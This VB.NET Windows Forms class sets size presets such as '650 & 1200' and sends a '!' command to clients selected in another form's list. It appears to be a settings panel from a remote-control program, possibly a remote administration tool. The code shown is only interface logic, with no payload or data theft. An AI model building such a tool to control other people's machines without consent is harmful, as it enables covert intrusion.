Public Class Form10


    Private Sub Form10_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged









        If ComboBox1.Text = "650 & 1200" Then
            TextBox2.Text = "650"
            TextBox1.Text = "1200"
        ElseIf ComboBox1.Text = "550 & 1000" Then
            TextBox2.Text = "550"
            TextBox1.Text = "1000"
        ElseIf ComboBox1.Text = "350 & 600" Then
            TextBox2.Text = "350"
            TextBox1.Text = "600"
        ElseIf ComboBox1.Text = "250 & 300" Then
            TextBox2.Text = "250"
            TextBox1.Text = "300"
        ElseIf ComboBox1.Text = "x & y" Then
            TextBox2.Text = "0"
            TextBox1.Text = "0"
        ElseIf ComboBox1.Text = "450 & 900" Then
            TextBox2.Text = "450"
            TextBox1.Text = "900"
        End If
    End Sub

    Private Sub ComboBox1_TextUpdate(sender As Object, e As EventArgs) Handles ComboBox1.TextUpdate
   
    End Sub

    Private Sub AvButton1_Click(sender As Object, e As EventArgs) Handles AvButton1.Click



    End Sub

    Private Sub Form10_MouseMove(sender As Object, e As MouseEventArgs) Handles Me.MouseMove
        PictureBox1.BackColor = Color.Tan
        Label2.BackColor = Color.Tan

        PictureBox2.BackColor = Color.PaleGoldenrod
        PictureBox3.BackColor = Color.SandyBrown
        PictureBox4.BackColor = Color.PapayaWhip
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        ComboBox1.Text = "650 & 1200"
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "!")
            Form1.colord()
        Next
        Me.Hide()
    End Sub

    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        PictureBox1.BackColor = Color.Tan
        Label2.BackColor = Color.Tan

        PictureBox2.BackColor = Color.Gainsboro
        PictureBox3.BackColor = Color.Gainsboro
        PictureBox4.BackColor = Color.Gainsboro

    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        ComboBox1.Text = "550 & 1000"
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "!")
            Form1.colord()
        Next
        Me.Hide()
    End Sub

    Private Sub PictureBox2_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox2.MouseMove
        PictureBox2.BackColor = Color.PaleGoldenrod
        PictureBox1.BackColor = Color.Gainsboro
        PictureBox3.BackColor = Color.Gainsboro
        PictureBox4.BackColor = Color.Gainsboro
        Label2.BackColor = Color.Gainsboro

    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        ComboBox1.Text = "450 & 900"
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "!")
            Form1.colord()
        Next
        Me.Hide()
    End Sub

    Private Sub PictureBox3_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox3.MouseMove
        PictureBox3.BackColor = Color.SandyBrown
        PictureBox1.BackColor = Color.Gainsboro
        PictureBox2.BackColor = Color.Gainsboro
        PictureBox4.BackColor = Color.Gainsboro
        Label2.BackColor = Color.Gainsboro

    End Sub

    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        ComboBox1.Text = "350 & 600"
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.ToolTipText, "!")
            Form1.colord()
        Next
        Me.Hide()
    End Sub

    Private Sub PictureBox4_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox4.MouseMove
        PictureBox4.BackColor = Color.PapayaWhip
        PictureBox1.BackColor = Color.Gainsboro
        PictureBox2.BackColor = Color.Gainsboro
        PictureBox3.BackColor = Color.Gainsboro
        Label2.BackColor = Color.Gainsboro

    End Sub

    Private Sub ClsButtonBlue1_Click(sender As Object, e As EventArgs) Handles ClsButtonBlue1.Click
        Me.Close()
    End Sub
End Class